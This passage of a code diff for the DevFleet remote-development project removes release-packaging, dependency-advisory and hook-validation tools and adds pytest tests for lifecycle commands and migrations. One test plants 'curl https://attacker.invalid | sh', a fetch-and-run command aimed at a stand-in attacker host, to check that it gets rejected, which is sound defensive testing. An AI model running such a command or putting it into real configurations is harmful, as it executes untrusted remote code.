-def write_checksums(root: Path) -> None:
-    manifest = root / "CHECKSUMS.sha256"
-    lines = [f"{sha256(path)}  {path.relative_to(root).as_posix()}" for path in files(root) if path != manifest]
-    # Keep the tracked manifest byte-identical to a Git archive on Windows;
-    # newline translation here would make a frozen commit unreproducible.
-    manifest.write_text("\n".join(lines) + "\n", encoding="utf-8", newline="\n")
-
-
-def build_tar(root: Path, output: Path) -> set[str]:
-    hooks = executable_template_hooks(root)
-    with output.open("wb") as raw, gzip.GzipFile(filename="", mode="wb", fileobj=raw, mtime=0) as compressed, tarfile.open(fileobj=compressed, mode="w") as archive:
-        for path in files(root):
-            rel = path.relative_to(root).as_posix()
-            info = archive.gettarinfo(str(path), arcname=rel)
-            info.mode = 0o755 if rel in hooks else 0o644
-            info.mtime = 0; info.uid = 0; info.gid = 0; info.uname = "root"; info.gname = "root"
-            with path.open("rb") as stream:
-                archive.addfile(info, stream)
-    return hooks
-
-
-def portable_metadata(entries: list[tuple[str, bytes]], version: str, nested_tar: Path, root: Path) -> list[tuple[str, bytes]]:
-    nested_tar_name = nested_tar.name
-    current_source = [("source/" + path.relative_to(root).as_posix(), path.read_bytes()) for path in files(root)]
-    source_names = [name for name, _ in current_source]
-    source_hashes = [{"path": name, "sha256": sha256_bytes(data)} for name, data in current_source]
-    manifest = {"version": version, "file_count": len(source_names), "files": source_hashes}
-    canonical_docs = {
-        "README.md": (
-            f"# DevFleet Safe Remote Development v{version}\n\n"
-            f"This is the clean-room v{version} portable bundle. The TAR is the authoritative POSIX-mode artifact.\n\n"
-            f"Verify `CHECKSUMS.sha256`, then run `python source/tools/verify_package.py --archive {nested_tar_name}` from the extracted bundle root.\n"
-        ).encode(),
-        "CLEAN-ROOM-VERIFICATION.md": (
-            f"# DevFleet {version} clean-room verification\n\n"
-            "Extract this ZIP into a fresh directory. From the extracted bundle root, run:\n\n"
-            f"`python source/tools/verify_package.py --archive {nested_tar_name}`\n\n"
-            "The command must complete successfully before the portable package is accepted.\n"
-        ).encode(),
-        "DIRECTORY-LAYOUT.md": (
-            f"# DevFleet {version} portable layout\n\n"
-            f"`source/` contains the complete canonical source. `{nested_tar_name}` preserves the release source and trusted POSIX hook modes.\n"
-        ).encode(),
-    }
-    rebuilt: list[tuple[str, bytes]] = []
-    for name, data in entries:
-        if name.startswith("devfleet-v1.2.") and name.endswith(".tar.gz"):
-            continue
-        if name.startswith("source/"):
-            continue
-        if name in {"portable-codebase-manifest.json", "portable-codebase-sha256.txt", "source-tree-manifest.json", "source-tree-sha256.txt"}:
-            continue
-        if name in canonical_docs:
-            continue
-        rebuilt.append((name, data))
-    rebuilt.extend(canonical_docs.items())
-    rebuilt.append((nested_tar_name, nested_tar.read_bytes()))
-    rebuilt.extend(current_source)
-    rebuilt.append(("portable-codebase-manifest.json", json.dumps(manifest, indent=2).encode()))
-    rebuilt.append(("source-tree-manifest.json", json.dumps({"version": version, "file_count": len(source_names), "files": source_hashes}, indent=2).encode()))
-    rebuilt.append(("source-tree-sha256.txt", ("\n".join(f"{item['sha256']}  {item['path']}" for item in source_hashes) + "\n").encode()))
-    rebuilt.append(("portable-codebase-sha256.txt", ("\n".join(f"{sha256_bytes(data)}  {name}" for name, data in sorted(rebuilt, key=lambda item: item[0].encode("utf-8")) if name not in {"portable-codebase-sha256.txt"}) + "\n").encode()))
-    _assert_portable_instruction_identity(rebuilt, version, nested_tar_name)
-    return rebuilt
-
-
-def sha256_bytes(data: bytes) -> str:
-    return hashlib.sha256(data).hexdigest()
-
-
-def _assert_portable_instruction_identity(entries: list[tuple[str, bytes]], version: str, nested_tar_name: str) -> None:
-    instruction_names = {"README.md", "CLEAN-ROOM-VERIFICATION.md", "DIRECTORY-LAYOUT.md"}
-    stale_version = re.compile(r"(?:DevFleet\s+v|devfleet-v)(\d+\.\d+\.\d+)")
-    for name, data in entries:
-        if name not in instruction_names:
-            continue
-        text = data.decode("utf-8", errors="strict")
-        for match in stale_version.finditer(text):
-            context = text[max(0, match.start() - 80):match.end() + 80].lower()
-            if match.group(1) != version and "historical" not in context:
-                raise ValueError(f"Portable release instruction {name} contains an unapproved prior release identity.")
-        if name == "CLEAN-ROOM-VERIFICATION.md" and nested_tar_name not in text:
-            raise ValueError(f"Portable clean-room instructions do not name {nested_tar_name}.")
-
-
-def main() -> None:
-    global args, root
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--source", type=Path, required=True)
-    parser.add_argument("--old-portable", type=Path, required=True)
-    parser.add_argument("--output-dir", type=Path, required=True)
-    args = parser.parse_args()
-    root = args.source.resolve()
-    args.output_dir.mkdir(parents=True, exist_ok=True)
-    (root / "CHECKSUMS.sha256").unlink(missing_ok=True)
-    write_checksums(root)
-    version = (root / "VERSION").read_text(encoding="utf-8").strip()
-    tar = args.output_dir / f"devfleet-v{version}.tar.gz"
-    hooks = build_tar(root, tar)
-    with zipfile.ZipFile(args.old_portable) as source_zip:
-        entries = [(item.filename, source_zip.read(item.filename)) for item in source_zip.infolist() if not item.is_dir()]
-    portable = args.output_dir / f"DevFleet-v{version}-Portable-Codebase-Verified-r1.zip"
-    rebuilt = portable_metadata(entries, version, tar, root)
-    with zipfile.ZipFile(portable, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as out:
-        for name, data in sorted(rebuilt, key=lambda item: item[0].encode("utf-8")):
-            info = zipfile.ZipInfo(name)
-            mode = 0o755 if name.removeprefix("source/") in hooks else 0o644
-            info.create_system = 3  # Unix origin; required for standard unzip mode restoration.
-            info.external_attr = (stat.S_IFREG | mode) << 16
-            out.writestr(info, data)
-    manifest = hook_mode_manifest(root); manifest.update({"version": version, "mode": "0755"})
-    (args.output_dir / "hook-mode-manifest.json").write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
-    print(json.dumps({"tar": str(tar), "portable": str(portable), "hook_count": len(hooks), "tar_sha256": sha256(tar), "portable_sha256": sha256(portable)}, indent=2))
-
-
-if __name__ == "__main__":
-    main()
-
-```
-
-
-## FILE: source/tools/check_dependency_advisories.py
-
-SHA256: 8901ed5ad3d19846030f2c6b8af5f03274277ef76b641b540a127d9994906185 | Bytes: 11275 | Git mode: 100644
-
-```
-"""Reproducible OSV freshness gate for the exact DevFleet dependency lock."""
-from __future__ import annotations
-
-import argparse
-import hashlib
-import json
-import sys
-import urllib.error
-import urllib.request
-from datetime import datetime, timezone
-from pathlib import Path
-
-from packaging.markers import Marker
-from packaging.requirements import InvalidRequirement, Requirement
-from packaging.utils import canonicalize_name
-
-try:
-    from cvss import CVSS2, CVSS3, CVSS4
-    from cvss.exceptions import CVSSError
-except ImportError as exc:  # pragma: no cover - exercised by release preflight
-    raise RuntimeError(
-        "release dependency gate requires the pinned 'cvss' release-tool dependency"
-    ) from exc
-
-
-OSV_QUERY_URL = "https://api.osv.dev/v1/query"
-TIMEOUT_SECONDS = 8
-HIGH_SCORE = 7.0
-CRITICAL_SCORE = 9.0
-KNOWN_SEVERITIES = {"NONE", "LOW", "MEDIUM", "MODERATE", "HIGH", "CRITICAL"}
-BLOCKING_SEVERITIES = {"HIGH", "CRITICAL", "UNKNOWN"}
-
-
-def _logical_requirement_lines(lock: Path) -> list[str]:
-    """Return requirement expressions from a pip-compile style lock.
-
-    Hashes and pip-compile annotations are deliberately ignored.  A continued
-    marker expression is retained, while a continued requirement is finalized
-    before the next top-level package line.
-    """
-    expressions: list[str] = []
-    pending: str | None = None
-    for physical in lock.read_text(encoding="utf-8").splitlines():
-        line = physical.strip()
-        if not line or line.startswith("#") or line.startswith("--hash="):
-            continue
-        # pip-compile may emit other option continuations; none are part of the
-        # PEP 508 requirement we need to query.
-        if line.startswith("--"):
-            continue
-        if " #" in line:
-            line = line.split(" #", 1)[0].rstrip()
-        if not line:
-            continue
-        if pending is not None:
-            if line.startswith(";") or line.startswith(","):
-                pending = f"{pending} {line}"
-                if pending.endswith("\\"):
-                    pending = pending[:-1].rstrip()
-                continue
-            expressions.append(pending)
-            pending = None
-        if line.endswith("\\"):
-            pending = line[:-1].rstrip()
-        else:
-            expressions.append(line)
-    if pending is not None:
-        expressions.append(pending)
-    return expressions
-
-
-def _requirement_expression(line: str) -> tuple[str, str, str | None]:
-    try:
-        requirement = Requirement(line)
-    except InvalidRequirement as exc:
-        raise ValueError(f"unsupported lock requirement: {line!r}") from exc
-    specifiers = list(requirement.specifier)
-    if len(specifiers) != 1 or specifiers[0].operator != "==" or specifiers[0].version.endswith(".*"):
-        raise ValueError(f"lock requirement is not an exact == pin: {line!r}")
-    version = specifiers[0].version.strip()
-    if not version or any(ch.isspace() for ch in version) or ";" in version:
-        raise ValueError(f"lock requirement has an invalid pinned version: {line!r}")
-    marker = str(requirement.marker) if requirement.marker else None
-    # Constructing Marker validates the complete expression, and makes the
-    # target-environment policy explicit even though all exact lock pins are
-    # queried conservatively below.
-    if marker:
-        Marker(marker)
-    return canonicalize_name(requirement.name), version, marker
-
-
-def lock_requirements(lock: Path) -> list[tuple[str, str, str | None]]:
-    parsed = [_requirement_expression(line) for line in _logical_requirement_lines(lock)]
-    if not parsed:
-        raise ValueError(f"lock contains no exact pinned requirements: {lock}")
-    # A compiled lock is the certified dependency set.  Query every exact pin,
-    # including platform-marked pins, rather than silently dropping a supported
-    # target.  Duplicate name/version rows are queried once.
-    unique: list[tuple[str, str, str | None]] = []
-    seen: set[tuple[str, str]] = set()
-    for package, version, marker in parsed:
-        key = (package, version)
-        if key not in seen:
-            seen.add(key)
-            unique.append((package, version, marker))
-    return unique
-
-
-def lock_packages(lock: Path) -> list[tuple[str, str]]:
-    return [(package, version) for package, version, _marker in lock_requirements(lock)]
-
-
-def _score(vulnerability: dict) -> float | None:
-    scores: list[float] = []
-    for item in vulnerability.get("severity", []) or []:
-        raw = str(item.get("score", ""))
-        if not raw:
-            continue
-        try:
-            kind = str(item.get("type") or "").upper()
-            if raw.startswith("CVSS:2.0/") or kind == "CVSS_V2":
-                scores.append(float(CVSS2(raw).scores()[0]))
-            elif raw.startswith(("CVSS:3.0/", "CVSS:3.1/")) or kind == "CVSS_V3":
-                scores.append(float(CVSS3(raw).scores()[0]))
-            elif raw.startswith("CVSS:4.0/") or kind == "CVSS_V4":
-                scores.append(float(CVSS4(raw).scores()[0]))
-            else:
-                # OSV has historically emitted numeric scores for some records;
-                # accept only a complete numeric value in the valid CVSS range.
-                numeric = float(raw)
-                if 0.0 <= numeric <= 10.0:
-                    scores.append(numeric)
-        except (TypeError, ValueError, IndexError, CVSSError):
-            continue
-    return max(scores) if scores else None
-
-
-def _declared_severities(vulnerability: dict) -> list[str]:
-    values: list[str] = []
-    specific = vulnerability.get("database_specific") or {}
-    for value in (specific.get("severity"),):
-        if value is not None:
-            values.append(str(value).upper())
-    for affected in vulnerability.get("affected", []) or []:
-        if not isinstance(affected, dict):
-            continue
-        ecosystem_specific = affected.get("ecosystem_specific") or {}
-        if ecosystem_specific.get("severity") is not None:
-            values.append(str(ecosystem_specific["severity"]).upper())
-    return values
-
-
-def _severity(vulnerability: dict) -> str:
-    declared_values = _declared_severities(vulnerability)
-    invalid_declared = [value for value in declared_values if value not in KNOWN_SEVERITIES]
-    declared = max(
-        (value for value in declared_values if value in KNOWN_SEVERITIES),
-        key=lambda value: {"NONE": 0, "LOW": 1, "MEDIUM": 2, "MODERATE": 2, "HIGH": 3, "CRITICAL": 4}[value],
-        default="",
-    )
-    score = _score(vulnerability)
-    if score is not None:
-        score_label = "CRITICAL" if score >= CRITICAL_SCORE else "HIGH" if score >= HIGH_SCORE else "MEDIUM" if score >= 4.0 else "LOW" if score > 0 else "NONE"
-        rank = {"NONE": 0, "LOW": 1, "MEDIUM": 2, "MODERATE": 2, "HIGH": 3, "CRITICAL": 4}
-        if rank[score_label] > rank.get(declared, -1):
-            declared = score_label
-    invalid_vectors = any(
-        str(item.get("score") or "").upper().startswith("CVSS:") and _score({"severity": [item]}) is None
-        for item in vulnerability.get("severity", []) or []
-        if isinstance(item, dict)
-    )
-    if (invalid_declared or invalid_vectors) and declared not in {"HIGH", "CRITICAL"}:
-        return "UNKNOWN"
-    if score is not None and score >= CRITICAL_SCORE:
-        return "CRITICAL"
-    if score is not None and score >= HIGH_SCORE:
-        return "HIGH"
-    return declared or "UNKNOWN"
-
-
-def query(package: str, version: str) -> dict:
-    body = json.dumps({"package": {"name": package, "ecosystem": "PyPI"}, "version": version}).encode()
-    request = urllib.request.Request(OSV_QUERY_URL, data=body, headers={"Content-Type": "application/json"}, method="POST")
-    with urllib.request.urlopen(request, timeout=TIMEOUT_SECONDS) as response:
-        return json.load(response)
-
-
-def run(lock: Path, allowlist: Path) -> dict:
-    checked_at = datetime.now(timezone.utc).isoformat()
-    lock_bytes = lock.read_bytes()
-    allowlist_bytes = allowlist.read_bytes() if allowlist.is_file() else b'{"exceptions": []}'
-    allowed = json.loads(allowlist.read_text(encoding="utf-8")) if allowlist.is_file() else {"exceptions": []}
-    exceptions = {
-        (str(item.get("advisory_id")), str(item.get("package")).lower().replace("_", "-"), str(item.get("affected_version"))): item
-        for item in allowed.get("exceptions", [])
-        if isinstance(item, dict)
-    }
-    results: list[dict] = []
-    blocking: list[dict] = []
-    errors: list[str] = []
-    for package, version, marker in lock_requirements(lock):
-        try:
-            response = query(package, version)
-            vulnerabilities = response.get("vulns", []) or []
-            advisories = []
-            for vulnerability in vulnerabilities:
-                advisory_id = str(vulnerability.get("id") or "unknown")
-                severity = _severity(vulnerability)
-                item = {"id": advisory_id, "severity": severity, "summary": str(vulnerability.get("summary") or "")[:500]}
-                advisories.append(item)
-                if severity in BLOCKING_SEVERITIES and (advisory_id, package, version) not in exceptions:
-                    blocking.append({"package": package, "version": version, **item})
-            results.append({"package": package, "version": version, "marker": marker, "query": {"package": {"name": package, "ecosystem": "PyPI"}, "version": version}, "advisories": advisories, "status": "PASS" if not advisories else "ADVISORIES_REVIEWED"})
-        except (OSError, urllib.error.URLError, TimeoutError, json.JSONDecodeError) as exc:
-            errors.append(f"{package}=={version}: {type(exc).__name__}: {exc}")
-            results.append({"package": package, "version": version, "status": "ERROR", "error": str(exc)[:500]})
-    status = "BLOCKED" if blocking or errors else "PASS"
-    return {
+def _legacy_project(slug: str, template_root: Path, *, exact: bytes | None = None) -> Path:
+    project = SETTINGS.workspaces / slug
+    (project / ".devfleet").mkdir(parents=True, exist_ok=True)
+    (project / "compose.yaml").write_text("services:\n  app:\n    image: ubuntu:24.04\n", encoding="utf-8")
+    metadata = {
         "schema_version": 2,
-        "checker": "DevFleet dependency advisory gate",
-        "checker_version": "2.0.0",
-        "status": status,
-        "source": OSV_QUERY_URL,
-        "checked_at": checked_at,
-        "lock": str(lock),
-        "lock_sha256": hashlib.sha256(lock_bytes).hexdigest(),
-        "allowlist": str(allowlist),
-        "allowlist_sha256": hashlib.sha256(allowlist_bytes).hexdigest(),
-        "target_environment_policy": "query every exact pin in the compiled lock, including platform-marked pins; deduplicate only identical canonical package/version pairs",
-        "packages": results,
-        "blocking_advisories": blocking,
-        "errors": errors,
+        "managed_by": "devfleet",
+        "slug": slug,
+        "identity": slug,
+        "project_id": PROJECT_ID,
+        "host_id": SETTINGS.node_name,
+        "template": "typescript-next",
+        "runtime_isolation": "container",
+        "runtime_type": "container",
+        "runtime_provider": "docker-compose",
+        "resource_profile": "small",
+        "lifecycle_status": "stopped",
+        "bootstrap_command": "./.devfleet/bootstrap.sh",
+        "health_command": "./.devfleet/health-check.sh",
     }
+    payload = exact if exact is not None else json.dumps(metadata, separators=(",", ":")).encode()
+    (project / ".devfleet" / "project.json").write_bytes(payload)
+    (project / ".devfleet" / "template.json").write_text(json.dumps({"id": "typescript-next"}), encoding="utf-8")
+    canonical = template_root / "typescript-next" / ".devfleet"
+    canonical.mkdir(parents=True, exist_ok=True)
+    (canonical / "template.json").write_text(json.dumps({"id": "typescript-next", **LIFECYCLE}), encoding="utf-8")
+    return project
 
 
-def main() -> int:
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--lock", type=Path, required=True)
-    parser.add_argument("--allowlist", type=Path, required=True)
-    parser.add_argument("--output", type=Path, required=True)
-    args = parser.parse_args()
-    report = run(args.lock, args.allowlist)
-    args.output.parent.mkdir(parents=True, exist_ok=True)
-    args.output.write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")
-    print(json.dumps({"status": report["status"], "packages": len(report["packages"]), "blocking": len(report["blocking_advisories"]), "errors": len(report["errors"])}))
-    return 0 if report["status"] == "PASS" else 2
+def _migration_mocks(monkeypatch: pytest.MonkeyPatch, slug: str, *, source_running: bool = False):
+    calls: list[str] = []
+    monkeypatch.setattr(projects, "running", lambda _project: source_running)
+    monkeypatch.setattr(projects, "backup_project", lambda _slug: json.dumps({"backup_status": "verified", "backup_id": "provider-backup", "backup_sha256": "a" * 64}))
+    monkeypatch.setattr(projects, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 24, "allocatable_disk_gb": 300}})
+    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda *args, **kwargs: {"ok": True})
+    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": f"devfleet-project-{slug}", "address": "10.0.0.9"}))
+    monkeypatch.setattr(projects.VmRuntimeOperations, "stop", staticmethod(lambda value, _meta: calls.append(f"vm-stop:{value}") or {"state": "stopped"}))
+    monkeypatch.setattr(projects, "import_project_workspace", lambda *args, **kwargs: {"ok": True, "workspace_preserved": True, "archive_sha256": "b" * 64, "source_archive_sha256": "b" * 64, "target_archive_sha256": "b" * 64})
+    return calls
 
 
-if __name__ == "__main__":
-    raise SystemExit(main())
+def test_explicit_project_command_wins_and_legacy_canonical_fallback(monkeypatch, tmp_path):
+    slug = "v125-command-resolution"
+    project = _legacy_project(slug, tmp_path / "templates")
+    raw = json.loads((project / ".devfleet" / "project.json").read_text())
+    raw["start_command"] = "docker compose restart"
+    (project / ".devfleet" / "project.json").write_text(json.dumps(raw), encoding="utf-8")
+    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
 
-```
+    result = projects.project_command_readiness(project)
 
-
-## FILE: source/tools/hook_modes.py
-
-SHA256: 3010bf588f088c9e6d4e956c2127a06abfec78f4875eec3441475383b6e02e54 | Bytes: 5491 | Git mode: 100644
-
-```
-"""Single source of truth for executable template hook closure and modes."""
-from __future__ import annotations
-
-import json
-import re
-from dataclasses import dataclass
-from pathlib import Path
-import sys
-
-COMMAND_FIELDS = ("bootstrap_command", "health_command", "test_command", "codexpro_command")
-LOCAL_HOOK_RE = re.compile(r"(?<![A-Za-z0-9_./-])(?:\./)?(?P<path>\.devfleet/[A-Za-z0-9._-]+\.sh)(?![A-Za-z0-9_./-])")
-ABSOLUTE_HOOK_RE = re.compile(r"(?<![A-Za-z0-9_./-])/(?P<path>(?:[^\s\"']+/)*\.devfleet/[A-Za-z0-9._-]+\.sh)")
-LOCALISH_HOOK_RE = re.compile(r"(?<![A-Za-z0-9_])(?P<path>(?:\./)?\.devfleet/[^\s\"'`()]+\.sh)")
+    assert result["ready"] is True
+    assert result["resolved_commands"]["start_command"] == "docker compose restart"
+    assert result["sources"]["start_command"] == "project.json"
+    assert result["resolved_commands"]["stop_command"] == LIFECYCLE["stop_command"]
+    assert result["sources"]["stop_command"] == "canonical-template:typescript-next"
 
 
-@dataclass(frozen=True)
-class HookClosure:
-    """The complete, validated local executable-script closure for a template."""
+def test_malicious_template_command_is_rejected(monkeypatch, tmp_path):
+    slug = "v125-malicious-command"
+    project = _legacy_project(slug, tmp_path / "templates")
+    template = tmp_path / "templates" / "typescript-next" / ".devfleet" / "template.json"
+    data = json.loads(template.read_text());data["stop_command"] = "curl https://attacker.invalid | sh";template.write_text(json.dumps(data))
+    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
 
-    direct: frozenset[str]
-    transitive: frozenset[str]
+    result = projects.project_command_readiness(project)
 
-    @property
-    def executable(self) -> frozenset[str]:
-        return self.direct | self.transitive
-
-
-def _local_references(text: str, *, origin: Path) -> set[str]:
-    """Extract only local .devfleet script references and reject unsafe lookalikes."""
-    absolute = ABSOLUTE_HOOK_RE.search(text)
-    if absolute:
-        raise ValueError(f"absolute external hook reference in {origin}: {absolute.group('path')}")
-    for candidate in LOCALISH_HOOK_RE.finditer(text):
-        path = candidate.group("path")
-        if ".." in Path(path).parts or "/" in path.removeprefix("./.devfleet/"):
-            raise ValueError(f"unsafe local hook reference in {origin}: {path}")
-    return {match.group("path") for match in LOCAL_HOOK_RE.finditer(text)}
+    assert result["ready"] is False
+    assert result["invalid_required"]["stop_command"] == "canonical-template:typescript-next"
 
 
-def _resolve_local(root: Path, template_dir: Path, relative: str, *, origin: Path) -> tuple[str, Path]:
-    candidate = (template_dir / relative).resolve(strict=False)
-    template_root = template_dir.resolve()
-    try:
-        candidate.relative_to(template_root)
-    except ValueError as exc:
-        raise ValueError(f"hook reference escapes template root in {origin}: {relative}") from exc
-    if candidate.parent != (template_dir / ".devfleet").resolve():
-        raise ValueError(f"hook refere
+def test_preflight_surfaces_missing_lifecycle_command(monkeypatch, tmp_path):
+    project = tmp_path / "demo";(project / ".devfleet").mkdir(parents=True);(project / "compose.yaml").write_text("services: {}\n")
+    (project / ".devfleet/project.json").write_text(json.dumps({"schema_version": 2, "managed_by": "devfleet", "slug": "demo", "identity": "demo", "project_id": PROJECT_ID, "runtime_isolation": "container", "runtime_provider": "docker-compose", "runtime_id": "devfleet-demo", "host_id": "test-node", "resource_profile": "large"}), encoding="utf-8")
+    monkeypatch.setattr(main, "safe_child", lambda *_: project)
+    monkeypatch.setattr(main, "inspect_workspace", lambda *_: {"safe_for_archive": True})
+    monkeypatch.setattr(main, "detect_runtime", lambda *_: {"runtime_type": "container"})
+    monkeypatch.setattr(main, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 20, "allocatable_disk_gb": 300}})
+    monkeypatch.setattr(main, "project_command_readiness", lambda *_: {"ready": False, "missing_required": ["stop_command"], "invalid_required": {}})
+
+    result = main._preflight("demo", "vm", "large")
+
+    assert result["lifecycle_commands_ready"] is False
+    assert result["migration_ready"] is False
+    assert any("stop_command" in blocker for blocker in result["blockers"])
+
+
+def test_stopped_legacy_container_import_stops_vm_not_application(monkeypatch, tmp_path):
+    slug = "v125-jobfinder-stopped"
+    _legacy_project(slug, tmp_path / "templates")
+    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
+    calls = _migration_mocks(monkeypatch, slug, source_running=False)
+    monkeypatch.setattr(projects, "stop_project", lambda *_: pytest.fail("stopped-source path must not invoke application stop"))
+
+    result = projects.assign_project_runtime(slug, "vm", "small")
+    saved = projects.load_meta(SETTINGS.workspaces / slug)
+
+    assert result["application_health"] == "not-run-stopped"
+    assert calls == [f"vm-stop:{slug}"]
+    assert saved["lifecycle_status"] == "stopped"
+    assert all(saved[key] == value for key, value in LIFECYCLE.items())
+
+
+def test_running_container_still_uses_start_and_health_workflow(monkeypatch, tmp_path):
+    slug = "v125-running-workflow"
+    project = _legacy_project(slug, tmp_path / "templates")
+    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
+    calls = _migration_mocks(monkeypatch, slug, source_running=True)
+    monkeypatch.setattr(projects, "stop_project", lambda value: calls.append(f"source-stop:{value}") or "stopped")
+
+    def start(value):
+        calls.append(f"destination-start:{value}")
+        meta = projects.load_meta(project);meta["lifecycle_status"] = "running";meta["health_status"] = "healthy";projects.atomic_json(projects.metadata_path(project), meta)
+        return "started"
+
+    monkeypatch.setattr(projects, "start_project", start)
+    monkeypatch.setattr(projects, "runtime_health", lambda *_: {"ok": True, "healthy": True})
+    monkeypatch.setattr(projects, "health_project", lambda *_: "healthy")
+
+    result = projects.assign_project_runtime(slug, "vm", "small")
+
+    assert result["application_health"] == "healthy"
+    assert f"source-stop:{slug}" in calls and f"destination-start:{slug}" in calls
+    assert not any(call.startswith("vm-stop:") for call in calls)
+
+
+def test_rollback_restores_legacy_metadata_bytes_exactly(monkeypatch, tmp_path):
+    slug = "v125-exact-rollback"
+    template_root = tmp_path / "templates"
+    project = _legacy_project(slug, template_root)
+    original = (project / ".devfleet" / "project.json").read_bytes()
+    monkeypatch.setattr(projects, "TEMPLATE_ROOT", template_root)
+    _migration_mocks(monkeypatch, slug)
+    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_: (_ for _ in ()).throw(RuntimeError("injected provision failure"))))
+
+    with pytest.raises(RuntimeError, match="injected provision failure"):
+        projects.assign
